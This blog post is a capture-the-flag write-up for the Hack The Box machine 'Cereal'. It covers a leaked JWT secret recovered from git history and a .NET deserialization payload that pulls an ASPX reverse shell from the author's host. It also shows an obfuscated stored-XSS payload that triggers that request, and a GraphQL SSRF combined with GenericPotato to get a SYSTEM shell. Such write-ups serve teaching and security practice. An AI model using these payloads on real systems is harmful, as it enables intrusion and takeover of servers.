@@ -1,0 +1,398 @@
+---
+layout: single
+title:  "HTB: Cereal"
+classes: wide
+excerpt: "Cereal is the single most amazing box I've done on hack the box. It starts by finding an ASP.NET Core source code of the application running on port 443, reviewing the code..."
+categories: HTB
+---
+
+![0](/assets/images/HTB/Cereal/0.png){: width="500px" }
+
+## Introduction 
+Cereal is the single most amazing box I've done on hack the box. It starts by finding an ASP.NET Core source code of the application running on port 443, reviewing the code, you'll find that it is vulnerable to deserialization but due to a certain if statement, it is not possible to directly get code execution from it. After further reviewing the source code, I find a class that is used to upload files on the box, so I can create a serialized object of this class and make it upload a reverse shell. In order to trigger the deserialization process, I have to bypass a certain whitelist that prevents any requests except those originating from localhost to trigger the deserialization code. To do so, I'll exploit a stored XSS in react that is found from reviewing the code of the front-end code. For root, I have a user with impersonation privilege but can't get authentication from rpc. I also find a grahpql endpoint, and when enumerating the schema, I find a mutation that can be used to send HTTP requests and I can get authentication from it. To exploit this, I'll use a tool called GenericPotato that understands HTTP and can impersonate a user connecting over it to get code execution as root.
+
+## Recon
+As always I start with `nmap` which reveals 3 ports open ( `HTTP, HTTPS and SSH` )
+
+![1](/assets/images/HTB/Cereal/1.png)
+
+## TCP 443 - HTTPS
+from the nmap scan you can see 2 possible subdomains ( `cereal.htb` and `source.cereal.htb` ) so I add those to my hosts file
+
+![2](/assets/images/HTB/Cereal/2.png)
+
+Trying to visit `http://cereal.htb` redirects you to `https://cereal.htb` that only has a login page for now
+
+![3](/assets/images/HTB/Cereal/3.png)
+
+
+Also, both `http://source.cereal.htb` and `https://source.cereal.htb` returns the same error page that leaks an internal path on the OS (`C:\inetpub\source\default.aspx`)
+
+![4](/assets/images/HTB/Cereal/4.png)
+
+## source.cereal.htb
+
+To start exploring what else could be on that vhost, I used `wfuzz` to find more endpoints and I got the following 3 results::
+```bash
+wfuzz -c -v -w /usr/share/wordlists/dirb/common.txt --hc 404 https://source.cereal.htb/FUZZ
+```
+
+![5](/assets/images/HTB/Cereal/5.png)
+
+The uploads directory seems interesting but sadly though, it gives back 403 response if you tried visiting it. also, fuzzing for files inside that directory was a dead end as well.<br />
+On the other hand, it seems that we discovered a .git repo exposed on the website, and using [git-dumper](https://github.com/arthaud/git-dumper){:target="_blank"} I can download the repo to my local VM.
+
+![6](/assets/images/HTB/Cereal/6.png)
+
+![7](/assets/images/HTB/Cereal/7.png)
+## Enumerating the project leaked
+After some quick browsing of the files, I can see that the project leaked is actually the front-end and back-end code of the app running on `https://cereal.htb`
+
+I come to that conclusion due to many reasons, some of which are seeing that the code in `/ClientApp/src/LoginPage` matches the login page on the website.<br />
+Also, the logo image next to the title in the browser's tab is the same as the one stored in `/ClientApp/public`.
+### 1. Understanding how Authentication Works
+
+To take this one step at a time, I'll focus first on explaining how the authentication mechanism works in this project and how to gain access to the app's functionality.
+
+The project is using `ASP.NET Core` as the programming language for the backend, and just taking a quick look at the names of the directories, I recognize this architecture in writing code and start by going into `/Controller` because that's where you'll find the actions taken based on the URLs that you visit.<br />
+Inside `/Controller` you'll find `RequestsController.cs` and `UserController.cs` and inside `UserController.cs` there is only one method called `Authenticate`
+
+![9](/assets/images/HTB/Cereal/9.png)
+
+`Authenticate` handles how the application acts if a user sends a POST request to `/authenticate`, and that POST request gets sent whenever a user tries to log in from the web page.
+
+This method starts by calling another function also called `Authenticate` from the services directory and here is where it becomes a little tricky.
+
+![10](/assets/images/HTB/Cereal/10.png)
+
+The method starts by trying to fetch a user object from the database with the same user and password provided to it, if it didn't find those it obviously stops and returns null
+
+Now, if a user is found, the app does the following:
+
+1. Generate a JWT token and sign it with a redacted secret key
+2. Adds a 7-day expiration date on the token
+3. Stores the JWT token in a property called `token` in the user object
+4. Calls `WithoutPassword` which is a method in `/ExtensionMethods.cs` that nulls the password property of the user
+5. Returns the user object
+
+It is obvious the app uses this JWT token to determine authenticated requests from others, so, If I can find out how it uses that token, I can generate my own valid one and use it to bypass the login page.
+
+Generating a token is not that hard of a task since the code to generate it is literally given to us in the project. The only issue is that we don't know the secret key to sign a valid token, but since this is a git project, we can enumerate previous versions (if existed) and see it the token was there before in an older version.
+
+I start by executing `git log` to see if there are any previous commits and indeed i find 3 more
+
+![11](/assets/images/HTB/Cereal/11.png)
+
+To compare the current code base with older branches I'll use `git diff [COMMIT]`{:style="color:orange"}
+It seems that the second commit has a comment saying `Security fixes`{:style="color:orange"} so I'll compare my current branch with the first commit that is before the security fixes with `git diff 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5` and that reveals the true secret key used to sign the JWT as `secretlhfIH&FY*#oysuflkhskjfhefesf`{:style="color:orange"}
+
+![12](/assets/images/HTB/Cereal/12.png)
+
+Now, that I have everything I need to generate a valid token, I copied the code to a new visual studio console application and generated my own signed JWT token
+
+![13](/assets/images/HTB/Cereal/13.png)
+
+The second part is to understand how to use this token to trick the application into thinking that I'm authenticated already and to do so, the answer lies in enumerating `/ClientApp`{:style="color:orange"}.
+
+Navigating to `/ClientApp/src/_services/authentication.service.js`{:style="color:orange"} you can see how it handles a successful login request.
+
+![14](/assets/images/HTB/Cereal/14.png)
+
+The app creates an entry in your browser's local storage with a key called `currentUser`{:style="color:orange"} and its value is a JSON object stored in a variable named `user`{:style="color:orange"}
+
+You can also see in the same file that it fetches that value stored in the local storage and saves it in an object called `currentUserSubject`{:style="color:orange"} and inside `authenticationService`{:style="color:orange"} it defines a function called `currentUserValue`{:style="color:orange"} that retrieves the JSON object stored in that local storage.
+
+![15](/assets/images/HTB/Cereal/15.png)
+
+To further understand this, I'll take a look on `/ClientApp/src/_helpers/auth-headers.js`{:style="color:orange"}
+
+![16](/assets/images/HTB/Cereal/16.png)
+
+This code does explain more about the nature of the JSON object in question. The app uses Bearer authentication and it is fetching the JWT token from the json object and exposing the key of the json object to be `token`{:style="color:orange"}.<br />
+So... to recap, If a user is authenticated, the app adds an entry in their browser's local storage that has:
+1. A key named `currentUser`{:style="color:orange"}
+2. A value which is a JSON object in the form of `{"token": "JWT_TOKEN"}`{:style="color:orange"}
+
+Furthermore, If you take a look on the login page from `/ClientApp/src/LoginPage/LoginPage.jsx`{:style="color:orange"}, you'll see that it tries to get the value stored in the local storage and if it succeeds, It redirects you to the login page and if it fails, it displays the login page
+
+So, having a valid token that is placed in the local storage in the form specified above will let us bypass the login page.
+
+![17](/assets/images/HTB/Cereal/17.png)
+
+### 2. Locating the Deserialization Vulnerability
+To get a rough idea of what to do next, I filled the form with dummy data and intercepted the request in Burp to see that it sends a POST request to `/requests`{:style="color:orange"} with my data.
+
+![18](/assets/images/HTB/Cereal/18.png)
+
+And once i forward the request, the page displays a `Great cereal request!`{:style="color:orange"} message and if i take a look on the response in burp repeater, I see that it responds with a message and a unique id of my request that is incremented every time i send a request
+
+![19](/assets/images/HTB/Cereal/19.png)
+
+![22](/assets/images/HTB/Cereal/22.png)
+
+If i take a look at `/Controller/RequestsController.cs`{:style="color:orange"} I can locate the function responsible for this, and it basically just stores the data i sent in the database.
+
+![20](/assets/images/HTB/Cereal/20.png)
+
+Now if you scroll down a bit you'll see a very interesting piece of code
+
+![21](/assets/images/HTB/Cereal/21.png)
+
+There is a lot to unpack here, but first, notice that according to the first two lines, this piece of code is triggered if you send a GET request to `/requests/{id}`{:style="color:orange"} and a certain policy named `RestrictIP`{:style="color:orange"} is met, so it makes sense that the `id`{:style="color:orange"} parameter is simply the id of the request stored in the database from before
+
+The code itself is pretty straightforward.
+
+* It fetches the JSON object correspondent to the id you specified from the database and,...
+    1. If the JSON object contains the word `objectdataprovider`{:style="color:orange"} or `windowsidentity`{:style="color:orange"} or `system`{:style="color:orange"} It stops execution and sends back a warning message.
+    2. If not, it deserializes the object in an insecure way [according to this article](https://rishabhupreti.azurewebsites.net/exploiting-and-securing-unsafe-json-deserialization-in-dot-net-web-application/){:target="_blank"}.
+
+In case you haven't noticed it yet, `objectdataprovider`{:style="color:orange"}, `windowsidentity`{:style="color:orange"} and `system`{:style="color:orange"} are all keywords you expect to see in `ysoserial`{:style="color:orange"} payloads. The main issue here is that the app checks to see if the word `system`{:style="color:orange"} exists in the JSON object stored, and this check effectively blocks all `ysoserial`{:style="color:orange"} payloads and every deserialized payload that could directly get you code execution in general since they all contain the keyword `system`{:style="color:orange"}
+
+### 3. Bypassing the Deserialization check
+
+With `ysoserial`{:style="color:orange"} out of the picture, I had to go back to further review the source code of the app until i found my answer in `/DownloadHelper.cs`{:style="color:orange"}
+
+![23](/assets/images/HTB/Cereal/23.png)
+
+The class has two parameters, `_URL`{:style="color:orange"} and `_FilePath`{:style="color:orange"} and when you set any of them, the app calls a `Download`{:style="color:orange"} method
+
+Taking a look at `Download`{:style="color:orange"}, It just makes sure that both `_URL`{:style="color:orange"} and `_FilePath`{:style="color:orange"} are set and not null or empty and then call a function called `DownloadFile`{:style="color:orange"}
+
+![24](/assets/images/HTB/Cereal/24.png)
+
+According to [Microsoft's documentation](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-5.0){:target="_blank"}, DownloadFile simply downloads a resource with the specified URI to a local file on the system
+
+![25](/assets/images/HTB/Cereal/25.png){: width="600" height="400"}
+
+My strategy is that, since the deserialized code does expect type information in the JSON object, and the deserialization is not handled in a secure fashion, I can create a serialized payload from the project leaked, that payload simply represents an object from the `DownloadHelper`{:style="color:orange"} class, and force the app to upload a reverse shell to the box.
+
+Creating such an object is not that hard of a task. You can simply deduce it from this article from before
+
+So, here is my object:
+```json
+{
+    '$type':'Cereal.DownloadHelper, Cereal',
+    'URL':'http://10.10.16.251:8000/jA.aspx',
+    'FilePath':'C:/inetpub/source/uploads/jA.aspx'
+}
+```
+
+where `'$type':'Cereal.DownloadHelper, Cereal'`{:style="color:orange"} is simply the type information and `'URL':'http://10.10.16.251:8000/jA.aspx','FilePath':'C:/inetpub/source/uploads/jA.aspx'`{:style="color:orange"} are used to set `_URL` and `_FilePath` and call the `Download`{:style="color:orange"} function afterwards
+
+**Note:** the value for `FilePath`{:style="color:orange"} ( `C:/inetpub/source/uploads/jA.aspx`{:style="color:orange"} ) is the directory leaked from `https://source.cereal.htb`{:style="color:orange"} at the very beginning
+
+**Note:** I'm uploading an ASPX reverse shell since this is an ASP.NET project and is hosted on IIS
+
+### 4. Bypassing the White List Policy
+Now that i have a JSON serialized object that can bypass the if statement and I'm left with one more thing. It is that in order to send a GET request to `/requests/{id}`{:style="color:orange"} i need to meet a certain policy named `RestrictIP`{:style="color:orange"} applied to the controller, and this policy is defined as `IPRequirement`{:style="color:orange"} Authorization policy in `/Startup.cs`{:style="color:orange"}
+
+![26](/assets/images/HTB/Cereal/26.png)
+
+Also, the `service`{:style="color:orange"} object in the image contains the configurations loaded from `/appsettings.json`{:style="color:orange"}, so if i go take a look at that I see that it is whitelisting localhost as IPv4 and IPv6
+
+![27](/assets/images/HTB/Cereal/27.png)
+
+In other words, If the person sending a GET request to `/requests/{id}` is not sending it from localhost, the deserialization code will not be triggered.
+
+In order to bypass such restriction, it is logical that you need to find some sort of a vulnerability that forces the admin on the box to send that request on my behalf (Stored XSS) (big shout-out to [@TheCyberGeek](https://www.hackthebox.com/home/users/profile/114053){:target="_blank"} for pointing me to the right direction on this one)
+
+If I'm going to find such a vulnerability, It is logical that it should exist in the front-end code (i.e. under /ClientApp/src) somewhere in the markdown.
+
+After hours of enumeration and cross-referencing the markdown with known issues that can lead to XSS, I found the following piece of code in `/ClientApp/src/AdminPage/AdminPage.jsx`{:style="color:orange"}
+
+![28](/assets/images/HTB/Cereal/28.png)
+
+It appears that the admin page renders a bunch of `Card`{:style="color:orange"} objects. These objects are simply the JSON requests stored in the db.
+What is so special about this piece of code is the line highlighted in red, It matches the same pattern of code required to get XSS [according to this synk vulnerability page](https://snyk.io/vuln/npm:react-marked-markdown:20180517){:target="_blank"}
+
+The issue is that if you tried to access the admin page from your browser you'll get redirected back to the login page and the token will be removed from the local storage
+
+It doesn't matter though, because I'm interested in stored xss otherwise, I can't bypass the whitelist restrictions. Also, It is very common in such scenarios on HTB that a scheduled task exists on the box that visits this page in a periodic way.
+
+To test this theory, I'll try a basic xss payload and see if It'll trigger any connection that i could catch on my listener. I need to inject my xss payload in the title parameter because it is the vulnerable one.
+
+![29](/assets/images/HTB/Cereal/29.png)
+
+and after waiting for about 2 minutes, I got a response confirming that the xss works and there is indeed some sort of a scheduled task that visits the admin page from the box itself every now and then
+
+![30](/assets/images/HTB/Cereal/30.png)
+
+### 5. Running the Project Locally to inspect the Admin Page
+
+Since I'm able to force the admin to execute javascript i thought this is it, I can now send my serialized payload and trigger it like this:
+
+I first downloaded a copy of [this reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx){:target="_blank"} to my local vm
+
+I sent my serialized payload and got its code to be used later to trigger the deserialization
+
+![31](/assets/images/HTB/Cereal/31.png)
+
+```javascript
+var xhttp = new XMLHttpRequest();
+xhttp.open("GET", "https://cereal.htb/requests/23", true);
+xhttp.setRequestHeader("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJibGFoYmxhaCI6IjEiLCJuYmYiOjE2MjIyNTE4NjIsImV4cCI6MTYyMjg1NjY2MiwiaWF0IjoxNjIyMjUxODYyfQ.W_8JmuRzsXOtOMsFaS2Z6N5aV56J0IV-01_-vPl6gGQ");
+xhttp.send();
+```
+After trying to send the request with the js code multiple times and waiting for quite some time, It seems that something is off, and to better understand the issue here, and since I have the source code, I need to run the app locally and see how the payload is rendered in `/admin`{:style="color:orange"}.
+
+To do that I need to have VisualStudio, VC++ 2019, and NodeJs. after i installed these stuff, there are a few modifications to be done in the app itself
+
+* I need to change the secret key of the jwt token to the one restored from the older commit (Since i have full control on the source code, I can simply delete that entire part, but i choose to keep things simple)
+* I need to restore the db structure from migrations, and from `/CerealContext.cs`{:style="color:orange"}, I know that the db is located in `db/cereal.db`{:style="color:orange"}, so i created an empty folder named `db`{:style="color:orange"} then from Visual studio console i run `dotnet ef database update`{:style="color:orange"}.
+
+After restoring the db, i thought i might as well take a look and see if any sensitive information is stored in there
+
+![32](/assets/images/HTB/Cereal/32.png)
+
+![33](/assets/images/HTB/Cereal/33.png){: width="500" height="700"}
+
+Okay, it was a dead end. so, i run the project, I add my jwt to local storage and start and started the project from VC.
+
+I submitted a basic `alert(1)`{:style="color:orange"}, but when i look at how it is rendered in the admin page, I see that for some reason the payload is trimmed starting from the right parenthesis.
+
+![34](/assets/images/HTB/Cereal/34.png){: width="680" height="400"}
+
+![35](/assets/images/HTB/Cereal/35.png){: width="600" height="400"}
+
+**Note:** The creator mentioned to me that `target=_blank`{:style="color:orange"} is a bug, I have to remove it and then test (click on) my payload. If you don't remove it you'll have to use headless chrome since for `javascript:`{:style="color:orange"} urls, both firefox and chrome would appear to block them but in fact, they aren't
+
+![36](/assets/images/HTB/Cereal/36.png){: width="600" height="400"}
+
+In order to save some time I'll not go through my failed attempts, because this writeup is long enough already. Anyway, I found my answer in [Template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals){:target="_blank"}. The app doesn't like symbols like right parenthesis and double quotes and other stuff, but the backtick (\`) is accepted that's why i can pop an alert warning with the below and It'll be accepted: 
+```js
+[XSS](javascript: alert`1`)
+```
+
+![37](/assets/images/HTB/Cereal/37.png){: width="600" height="400"}
+
+My next payload is a bit tricky to understand. I used
+```js
+[XSS](javascript:let x = atob`PHNjcmlwdD52YXIgeGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3Q7eGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly8xMjcuMC4wLjE6ODAwMC9UZXN0WFNTLzM5IiwgdHJ1ZSk7eGh0dHAuc2VuZGBgOzwvc2NyaXB0Pg==`;
+document.write`${x}`;)
+``` 
+where the base64 encoded payload represents
+```javascript
+<script>var xhttp = new XMLHttpRequest;xhttp.open("GET", "http://127.0.0.1:8000/TestXSS/39", true);xhttp.send``;</script> 
+ ```
+Next, I visited the admin page, removed `target=_blank`{:style="color:orange"} and clicked on the payload, and got a response in my listener confirming that a payload structured like this will bypass all the symbols restrictions and stuff
+
+![38](/assets/images/HTB/Cereal/38.png)
+
+One weird thing that i struggled to understand is  how ``document.write`${x}` ``{:style="color:orange"} works, because `${x}`{:style="color:orange"} is passed as a second argument, and that makes the argument passed to it to be blank in this case
+
+![39](/assets/images/HTB/Cereal/39.png)
+
+Since tagged template literals pass an array of the raw non-template stuff, i thought I'll face some issues with `` eval`payload` ``{:style="color:orange"} and indeed i did, but trying out `document.write`{:style="color:orange"} instead of `eval`{:style="color:orange"}, it does actually appear to work.
+
+One other weird thing is that the behavior is different if you try `document.write(${x})`{:style="color:orange"} instead of `` document.write`${x}` ``{:style="color:orange"}, but that actually makes sense since doing `` document.write`${x}` ``{:style="color:orange"} is the same as doing ``document.write(["", ""], x)``{:style="color:orange"}
+
+I was also surprised `atob`{:style="color:orange"} actually works with an array argument, thats kinda strange, but it looks like it is actually made to handle arrays.
+
+Finally, I figured it out... It seems that the array `toString`{:style="color:orange"} method doesn't actually put brackets in the resulting string, so it ends up working with `atob`{:style="color:orange"} by complete coincidence 😅
+
+![40](/assets/images/HTB/Cereal/40.png)
+
+## Getting a User Shell
+
+Now enough of all this JS magic. Now it is time to write a code that'll actually trigger the payload.<br />
+The first step will be to actually submit the payload and get it's ID, which is in this case is 30
+
+![41](/assets/images/HTB/Cereal/41.png)
+
+As for the JS payload
+```js
+<script>var xhttp = new XMLHttpRequest;
+xhttp.open("GET", "https://127.0.0.1/requests/30", true);
+xhttp.setRequestHeader("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJibGFoYmxhaCI6IjEiLCJuYmYiOjE2MjIyNTE4NjIsImV4cCI6MTYyMjg1NjY2MiwiaWF0IjoxNjIyMjUxODYyfQ.W_8JmuRzsXOtOMsFaS2Z6N5aV56J0IV-01_-vPl6gGQ");
+xhttp.send``;</script>
+<img src="http://10.10.16.251:8000/WootWootx"/>
+```
+	
+
+
+then I'll base64 encode that payload and replace it with the one in `atob`{:style="color:orange"}, send it, and wait till i get a hit on my python server and the reverse shell actually is uploaded
+
+Also, for debugging purposes, I added that `img` tag at the end so that it'll send a request to my listener when the js code is executed. that way, I can know when the admin is executing my js payload.
+
+I sent my xss payload and waited for about minutes till i got a response and my shell got uploaded
+
+![42](/assets/images/HTB/Cereal/42.png)
+
+The next step is to just visit `https://source.cereal.htb/uploads/jA.aspx` to trigger my reverse shell and finally get a shell on the box and can read the user flag
+
+![43](/assets/images/HTB/Cereal/43.png)
+
+The first thing i did after gaining a shell on the box, and since i found ssh is running from the initial nmap scan, is to see if there are ssh keys for sonny on the box but i didn't find any. After that I wanted to take a look on what is stored in the db on the box itself so i took a copy from `C:\inetpub\Cereal\db\cereal.db`{:style="color:orange"} to my box to inspect it and i found the ssh creds for sonny in there
+
+![431](/assets/images/HTB/Cereal/43.1.png){: width="450" height="600"}
+## Trying to abuse SeImpersonatePrivilege
+
+As always, one of the first things you should check is the user's privileges, and indeed there is an interesting one, `SeImpersonatePrivilege`{:style="color:orange"}
+
+![44](/assets/images/HTB/Cereal/44.png)
+
+To determine what variation of Potato attacks I'll be using, I have to know the windows version I'm working on, and it is windows 10 version 1809
+
+![45](/assets/images/HTB/Cereal/45.png)
+
+Since, starting from Windows 10 version 1809, it is not possible to query the OXID resolver on a port other than 135 anymore, I have to use `RoguePotato`{:style="color:orange"}
+
+Just to save some time, I tested RoguePotato and it didn't work. After a bit of troubleshooting, I noticed that `winPEAS`{:style="color:orange"} actually says that port 135 is blocked by the firewall
+
+![46](/assets/images/HTB/Cereal/46.png)
+
+It seemed like a dead end for now, so i went back to further enumerate the hos and i found some interesting ports like SMB and port 8080 that didn't show in our initial scan
+
+![47](/assets/images/HTB/Cereal/47.png)
+
+To see what is running on port 8080, i used SSH local port forwarding to tunnel port 8080 to port 8080 on my local vm with `ssh -L 8080:127.0.0.1:8080 sonny@10.10.10.217`{:style="color:orange"}
+
+At first, It may seem like a simple website but when i checked the source code, I see that it is talking to a graphql endpoint to retrieve the data presented on the homepage
+
+![48](/assets/images/HTB/Cereal/48.png){: width="750" height="400"}
+
+![49](/assets/images/HTB/Cereal/49.png)
+
+The intended way to go through this part is by enumerating GraphQl schema but when i was doing that i came across the following error
+
+![50](/assets/images/HTB/Cereal/50.png)
+
+But, when i try to see what's inside that `E` drive i get a `cd : Cannot find drive. A drive with the name 'E' does not exist`{:style="color:orange"} error message. My guess is that it is a network share i can't see or something whose root is located at `C:\inetpub\manager`{:style="color:orange"}
+
+Then, by chance I found a dll named `CerealManager.DLL`{:style="color:orange"} when i tried to search for files that may contain that keyword
+
+![51](/assets/images/HTB/Cereal/51.png)
+
+I got a copy of that DLL after reversing it, I noticed an interesting mutation called `updatePlant`{:style="color:orange"} that takes a url as one of its parameter and pass it to `WebRequest.Create`{:style="color:orange"}
+
+![52](/assets/images/HTB/Cereal/52.png){: width="800" height="400"}
+
+A possible SSRF ??! to test this and see the headers, i set the `sourceURL`{:style="color:orange"} to point to my local vm
+
+![53](/assets/images/HTB/Cereal/53.png)
+
+At first, I thought it is PassTheHash but that was dump of me, but thanks to [@yb4Iym8f88](https://www.hackthebox.com/home/users/profile/31976){:target="_blank"} I finally understood the idea of this challenge.
+## 🥔 Potato over HTTP - GenericPotato 🥔
+RoguePotato is just askin ntlm auth on rpc when queried but since RPC is blocked, and since graphql runs as admin, I can get that authentication from HTTP. The problem is that Potato doesn't understand HTTP so I need some sort of middleware to make it understand it.
+
+Initially, the intended solution to this part was to manually modify `SweetPotato`{:style="color:orange"} and make it understand HTTP but, after like a month and a half from Cereal's release, the creator of the box release a tool called [GenericPotato](https://github.com/micahvandeusen/GenericPotato){:target="_blank"} that is able to impersonate authentication over HTTP
+
+Unfortunately, I don't have time to write about the intended way, but to keep this brief, `GenericPotato`{:style="color:orange"} basically is just SweetPotato with an extra file called `PotatoAPI.cs`{:style="color:orange"} that contains the code responsible for Impersonation. This piece of code below is really all that is needed to start a http listener and impersonate a connecting user.
+
+![54](/assets/images/HTB/Cereal/54.png)
+
+Long story short, you need to download and compile your version of `GenericPotato`{:style="color:orange"}. I then uploaded `GenericPotato`{:style="color:orange"} and `nc`{:style="color:orange"} to the box and started `GenericPotato`{:style="color:orange"} to listen on port 9000 and execute nc as the user trying to connect to port 9000 as follows:
+
+![55](/assets/images/HTB/Cereal/55.png)
+
+and finally, to impersonate the admin and get a system reverse shell, I need to send a request via `updatePlant`{:style="color:orange"} mutation to port 9000 and i get a shell:
+
+```bash
+curl -X "POST" -H "Content-Type: application/json"\
+-d "{'query':'mutation{updatePlant(plantId:2, version:3, sourceURL:\"http://127.0.0.1:9000\")}'}"\
+ "http://127.0.0.1:8080/api/graphql"
+```
+
+![56](/assets/images/HTB/Cereal/56.png)
+
+<img src="http://www.hackthebox.eu/badge/image/206208" alt="Hack The Box">
